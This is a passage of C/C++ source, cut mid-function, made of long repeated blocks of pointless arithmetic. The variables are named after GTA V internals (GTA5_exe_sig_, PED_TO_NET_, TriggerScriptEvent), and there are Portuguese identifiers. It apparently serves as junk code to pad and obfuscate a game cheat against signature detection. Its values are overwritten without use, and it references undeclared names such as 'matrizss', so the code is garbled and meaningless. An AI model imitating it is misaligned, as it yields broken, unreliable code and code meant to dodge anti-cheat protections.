						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
						GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
						a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
					}
					else
					{
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
						GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
						GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
						a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					}
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
					a = 0.0f;
					b = 0.0f;
					if (GTA5_exe_sig_[4] > 50.0f)
					{
						GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					}
					a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
					a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
					b = 0.0f;
					GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
					GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
					GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
					GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
					GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
					a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
					GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
					if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
					a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
						offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
						offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
						offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						offset = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (5) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
					TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
					offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
					TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					offset = (0xB1231 * 0xA) + 0xA12;
					if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
						TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
						TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
						a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
					}
					else
					{
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
						TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
						TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
						TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
						TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
						a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
						a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					}
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
					a = 0.0f;
					b = 0.0f;
					if (TriggerScriptEvent[4] > 50.0f)
					{
						TriggerScriptEvent[4] = TriggerScriptEvent[1];
					}
					a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
					a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
					NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
					a = 0.0f;
					a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
					b = 0.0f;
					TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
					TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
					TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = TriggerScriptEvent[1];
					TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
					TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
					TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
					TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
					a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
					TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
					if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
					{
					}
					else
						a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
					a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
				}
				return tokens;
			}
			else
			{
				if (offset > aaaaaa)
				{
					matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
					matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
					offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
					offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
					offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
					offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
					offset = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = ponteiro * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				offset = (0xB1231 * 0xA) + 0xA12;
				if (offset > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

				if (matriz[1] > aaaaaa)
				{
					matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
					matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
					matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
					matriz[7] = (0xB1231 * 0xA) + matriz[2];
					a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
				}
				else
				{
					matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
					matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
					matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
					matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
					matriz[1] = (0xB1231 * 0xA) + 0xA12;
					a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
					a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				}
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
				a = 0.0f;
				b = 0.0f;
				if (matriz[4] > 50.0f)
				{
					matriz[4] = matriz[1];
				}
				a2 = (matriz[4]) / (2 * matriz[2]);
				a1 = (matriz[3] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (matriz[3] + (5)) / (2 * matriz[2]);
				aaaaaa = 0xB2 * 2;
				a = 0.0f;
				a1 = (matriz[3] + (4)) / (2 * matriz[2]);
				b = 0.0f;
				matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				matriz[4] = matriz[1];
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
				a2 = (matriz[4] + (3)) / (2 * matriz[2]);
				a2 = (matriz[4] + (2)) / (2 * matriz[2]);
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				if (matriz[1] > aaaaaa)
				{
				}
				else
					a1 = (matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (matriz[4] - (3)) / (2 * matriz[2]);

